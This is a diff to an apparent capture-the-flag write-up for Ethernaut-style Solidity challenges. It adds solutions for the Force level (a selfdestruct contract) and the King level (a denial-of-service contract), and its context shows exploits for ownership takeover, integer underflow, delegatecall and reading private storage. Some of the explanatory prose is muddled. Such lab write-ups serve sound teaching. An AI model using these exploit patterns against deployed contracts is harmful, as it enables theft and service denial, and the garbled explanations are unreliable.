@@ -9,7 +9,7 @@ authors:
     - kappa
 ---
 
-## Level 2 - Fallback
+## Level 1 - Fallback
 **Objective:** Become the contract owner.
 
 ### Vulnerability
@@ -32,7 +32,7 @@ await sendTransaction({from: player, to: contract.address, value: toWei('0.00000
 await contract.withdraw();
 ```
 
-## Level 3 - Fal1out
+## Level 2 - Fal1out
 **Objective:** Claim ownership.
 
 ### Vulnerability
@@ -51,7 +51,7 @@ Call the "constructor" manually:
 await contract.Fal1out();
 ```
 
-## Level 4 - Coin Flip
+## Level 3 - Coin Flip
 **Objective:** Guess the flip outcome 10 times consecutively.
 
 ### Vulnerability
@@ -91,7 +91,7 @@ contract CoinFlipPwn{
 - Deploy `CoinFlipPwn` with the target contract address.
 - Call `attack()` 10 times (waiting for new blocks between calls).
 
-## Level 5 - Telephone
+## Level 4 - Telephone
 **Objective:** Claim ownership.
 
 - `tx.origin` - Always the user (EOA - External Owned Account) that signed the transaction, doesn't matter the intermediary.
@@ -128,7 +128,7 @@ contract TelephonePwn {
 }
 ```
 
-## Level 6 - Token
+## Level 5 - Token
 **Objective:** Exploit integer underflow to gain tokens.
 
 ### Vulnerability
@@ -145,7 +145,7 @@ Transfer more tokens than you own (e.g., `2^256 - 1`):
 await contract.transfer(anyAddress, 2n**256n - 1n);
 ```
 
-## Level 7 - Delegation
+## Level 6 - Delegation
 **Objective:** Claim ownership via `delegatecall`.
 
 **delegatecall** - is a low-level function that allows one contract to call another contract and run its code within the context of the calling contract
@@ -159,9 +159,39 @@ await sendTransaction({
 });
 ```
 
-## Level 8 - Force *(In Progress)*
+## Level 7 - Force 
 
-## Level 9 - Vault
+**Objective:** Make a susccesful transaction
+
+### Vulnerability
+There is a vuln name "Force-Feeding" a contract. It seems that some time ago there was a moment where a hacker could hijack the ownership of a contract with a lot of currency 
+and there was no way the owners could nothing. That was like this until they added the method called `selfdestruct()`.
+
+- `selfdestruct()` - Low level function that destroys the contract and sends all the currency to the address given.
+
+> How EOA handles the transactions
+
+External Owned Accounts can't predict that other accounts sends them money. However they can handle **HOW**.
+- Functions marked as payable (even the constructor)
+- If ``receive()`` is payable
+- If there is no ``receive()`` solidity looks for ``fallback() external payable{}`` 
+If nothing matches then **revert()**
+
+### Solution
+
+Create a contract that selfdestructs when invoked that gives money to the contract address.
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+contract ForcePwn {
+    constructor(address payable _recipient) payable {
+        selfdestruct(_recipient);
+    }
+}
+```
+
+## Level 8 - Vault
 **Objective:** Unlock the vault by reading "private" storage.
 
 ### Vulnerability
@@ -178,4 +208,23 @@ Call `unlock()` with the password:
 
 ```javascript
 await contract.unlock(password);
+```
+## Level 9 - King
+
+**Objective:** Avoid that the contract owner autoclaims to be the king
+
+### Vulnerability
+
+It's a type of DoS that leverages the incorrect operation order and dependancy on fallible transfers. If the `transfer` to the current king fails, the entire transaction reverts. The attacker can make the transfer always fail after becoming king.
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract PwnKing {
+		constructor(address kingContract) payable {
+			(bool success,) = kingContract.call{value: msg.value}("");
+			require(success);
+		}
+}
 ```
